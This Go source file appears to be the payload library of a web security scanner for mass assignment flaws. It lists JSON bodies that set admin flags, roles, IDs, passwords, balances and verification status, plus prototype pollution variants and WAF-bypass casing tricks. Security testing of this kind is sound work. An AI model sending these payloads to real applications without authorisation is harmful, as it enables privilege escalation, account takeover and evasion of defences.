// Package massassign provides mass assignment vulnerability test payloads.
// Payloads are categorized by:
//   - Category (Privilege escalation, Identity manipulation, Status changes)
//   - Extra fields for testing (isAdmin, role, id, permissions, etc.)
//   - JSON body manipulation patterns
package massassign

// Category represents a mass assignment payload category.
type Category string

const (
	// Privilege represents privilege escalation payloads.
	Privilege Category = "privilege"
	// Identity represents identity manipulation payloads.
	Identity Category = "identity"
	// Status represents status/state change payloads.
	Status Category = "status"
	// Generic represents generic mass assignment payloads.
	Generic Category = "generic"
)

// Payload represents a mass assignment test payload.
type Payload struct {
	Value       string
	Category    Category
	Description string
	WAFBypass   bool
}

// ExtraField represents an extra field to inject during mass assignment testing.
type ExtraField struct {
	Name        string
	Value       interface{}
	Category    Category
	Description string
}

// GetPayloads returns payloads for a specific category.
func GetPayloads(category Category) []Payload {
	switch category {
	case Privilege:
		return privilegePayloads
	case Identity:
		return identityPayloads
	case Status:
		return statusPayloads
	default:
		return genericPayloads
	}
}

// GetAllPayloads returns all payloads for all categories.
func GetAllPayloads() []Payload {
	var all []Payload
	all = append(all, privilegePayloads...)
	all = append(all, identityPayloads...)
	all = append(all, statusPayloads...)
	all = append(all, genericPayloads...)
	return all
}

// GetExtraFields returns all extra fields for mass assignment testing.
func GetExtraFields() []ExtraField {
	return extraFields
}

// GetWAFBypassPayloads returns payloads designed for WAF evasion.
func GetWAFBypassPayloads() []Payload {
	all := GetAllPayloads()
	var result []Payload
	for _, p := range all {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// DeduplicatePayloads removes duplicate payloads based on Value and Category.
func DeduplicatePayloads(payloads []Payload) []Payload {
	seen := make(map[string]bool)
	var result []Payload
	for _, p := range payloads {
		key := p.Value + "|" + string(p.Category)
		if !seen[key] {
			seen[key] = true
			result = append(result, p)
		}
	}
	return result
}

// Extra fields for mass assignment testing.
var extraFields = []ExtraField{
	{Name: "isAdmin", Value: true, Category: Privilege, Description: "Boolean admin flag"},
	{Name: "role", Value: "admin", Category: Privilege, Description: "Role field escalation"},
	{Name: "admin", Value: true, Category: Privilege, Description: "Admin boolean flag"},
	{Name: "id", Value: 1, Category: Identity, Description: "Primary key manipulation"},
	{Name: "user_id", Value: 1, Category: Identity, Description: "User ID manipulation"},
	{Name: "email", Value: "attacker@evil.com", Category: Identity, Description: "Email address change"},
	{Name: "permissions", Value: []string{"admin", "write", "delete"}, Category: Privilege, Description: "Permissions array escalation"},
	{Name: "verified", Value: true, Category: Status, Description: "Account verification bypass"},
	{Name: "is_staff", Value: true, Category: Privilege, Description: "Staff flag escalation"},
	{Name: "is_superuser", Value: true, Category: Privilege, Description: "Superuser flag escalation"},
	{Name: "group", Value: "administrators", Category: Privilege, Description: "Group membership escalation"},
	{Name: "account_type", Value: "premium", Category: Status, Description: "Account type escalation"},
	{Name: "balance", Value: 999999, Category: Status, Description: "Balance manipulation"},
	{Name: "password", Value: "newpassword123", Category: Identity, Description: "Password override"},
	{Name: "active", Value: true, Category: Status, Description: "Account activation bypass"},
}

// Privilege escalation payloads.
var privilegePayloads = []Payload{
	{Value: `{"isAdmin": true}`, Category: Privilege, Description: "Set isAdmin boolean flag"},
	{Value: `{"role": "admin"}`, Category: Privilege, Description: "Set role to admin"},
	{Value: `{"admin": true}`, Category: Privilege, Description: "Set admin boolean flag"},
	{Value: `{"permissions": ["admin", "write", "delete"]}`, Category: Privilege, Description: "Set admin permissions array"},
	{Value: `{"is_staff": true, "is_superuser": true}`, Category: Privilege, Description: "Set staff and superuser flags"},
	{Value: `{"role": "administrator", "permissions": "*"}`, Category: Privilege, Description: "Set administrator role with wildcard permissions"},
	{Value: `{"group": "administrators"}`, Category: Privilege, Description: "Set group to administrators"},
	{Value: `{"access_level": 9999}`, Category: Privilege, Description: "Set maximum access level"},
}

// Identity manipulation payloads.
var identityPayloads = []Payload{
	{Value: `{"id": 1}`, Category: Identity, Description: "Override primary key to ID 1"},
	{Value: `{"user_id": 1}`, Category: Identity, Description: "Override user_id to 1"},
	{Value: `{"email": "attacker@evil.com"}`, Category: Identity, Description: "Override email address"},
	{Value: `{"username": "admin"}`, Category: Identity, Description: "Override username to admin"},
	{Value: `{"password": "newpassword123"}`, Category: Identity, Description: "Override password field"},
	{Value: `{"owner_id": 1}`, Category: Identity, Description: "Override resource owner ID"},
}

// Status/state change payloads.
var statusPayloads = []Payload{
	{Value: `{"verified": true}`, Category: Status, Description: "Set verified status to true"},
	{Value: `{"active": true}`, Category: Status, Description: "Set active status to true"},
	{Value: `{"approved": true}`, Category: Status, Description: "Set approved status to true"},
	{Value: `{"account_type": "premium"}`, Category: Status, Description: "Upgrade account type to premium"},
	{Value: `{"balance": 999999}`, Category: Status, Description: "Manipulate account balance"},
	{Value: `{"email_verified": true}`, Category: Status, Description: "Bypass email verification"},
}

// Generic mass assignment payloads.
var genericPayloads = []Payload{
	{Value: `{"isAdmin": true, "role": "admin"}`, Category: Generic, Description: "Combined admin escalation attempt"},
	{Value: `{"__proto__": {"isAdmin": true}}`, Category: Generic, Description: "Prototype pollution via mass assignment"},
	{Value: `{"constructor": {"prototype": {"isAdmin": true}}}`, Category: Generic, Description: "Constructor prototype pollution"},
	{Value: `{"isAdmin":true,"role":"admin","permissions":["*"],"verified":true}`, Category: Generic, Description: "Kitchen sink escalation attempt"},

	// WAF bypass variants
	{Value: `{"isAdmin":true}`, Category: Generic, Description: "Compact JSON admin flag bypass", WAFBypass: true},
	{Value: `{"is_admin": true}`, Category: Generic, Description: "Underscore variant admin flag", WAFBypass: true},
	{Value: `{"IsAdmin": true}`, Category: Generic, Description: "PascalCase admin flag bypass", WAFBypass: true},
	{Value: `{"ROLE": "ADMIN"}`, Category: Generic, Description: "Uppercase role and value bypass", WAFBypass: true},
}
